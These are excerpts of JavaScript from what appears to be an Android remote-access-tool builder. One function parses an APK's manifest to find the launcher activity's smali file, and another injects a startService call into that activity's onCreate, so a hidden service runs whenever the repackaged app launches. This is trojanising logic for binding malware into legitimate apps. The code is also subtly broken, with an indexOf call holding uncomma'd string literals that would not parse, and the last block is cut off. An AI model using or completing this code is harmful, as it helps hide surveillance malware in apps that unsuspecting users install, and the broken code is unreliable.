// Launcher Extraction for "<application" attribute | AppCtrl.js = Line 5658 --> 5707 |
// ================================================ | =============================== |
function GetLauncherPath(manifest, smaliPath) {


    var regex = /<application/gi,
        result, indices = [];
    while ((result = regex.exec(manifest))) {
        indices.push(result.index);
    }

    var indexOfLauncher = manifest.indexOf(
        'android.intent.action.MAIN'
        'android.intent.category.DEFAULT',
        +
        'android.intent.action.MAIN'
        'android.intent.category.INFO',
        +
        'android.intent.action.MAIN'
        'android.intent.category.LAUNCHER'
        );
    var indexOfApplication = -1;
    
    if (indexOfLauncher != -1) {
        manifest = manifest.substring(0, indexOfLauncher);
        for (var i = indices.length - 1; i >= 0; i--) {
            if (indices[i] < indexOfLauncher) {
                indexOfApplication = indices[i];
                manifest = manifest.substring(indexOfApplication, manifest.length);
                break;
            }
        }


        if (indexOfApplication != -1) {

            if (manifest.indexOf('android:targetActivity="') != -1) {
                manifest = manifest.substring(manifest.indexOf('android:targetActivity="') + 24);
                manifest = manifest.substring(1, manifest.indexOf('"'))
                manifest = path.join(smaliPath, manifest) + '.smali';
                var files = fs.walkSync(smaliPath);
                for (var i = 0; i < files.length; i++) {
                    if (files[i].substring(files[i].lastIndexOf("/") + 1) == manifest)
                        return files[i];
                }

            } else {
                manifest = manifest.substring(manifest.indexOf('android:name="') + 14);
                manifest = manifest.substring(0, manifest.indexOf('"'))
                manifest = manifest.replace(/\./g, "/");
                manifest = path.join(smaliPath, manifest) + ".smali"
                return manifest;
            }

        }
    }
    return -1;



  }

  

// OrgAppKey2 | Constants.js = Line 32 |
// ========== | ====================== |
exports.orgAppKey2 = ';->onCreate()V';



// OrgAppKey2 specification | AppCtrl.js = Line 5553 --> 5560 |
// ======================== | =============================== |
var key = CONSTANTS.orgAppKey2;
$appCtrl.Log("Modifiying launcher activity...");
var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
fs.writeFile(launcherPath, output, 'utf8', (error) => {
    if (error) {
        $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
        return;
    }
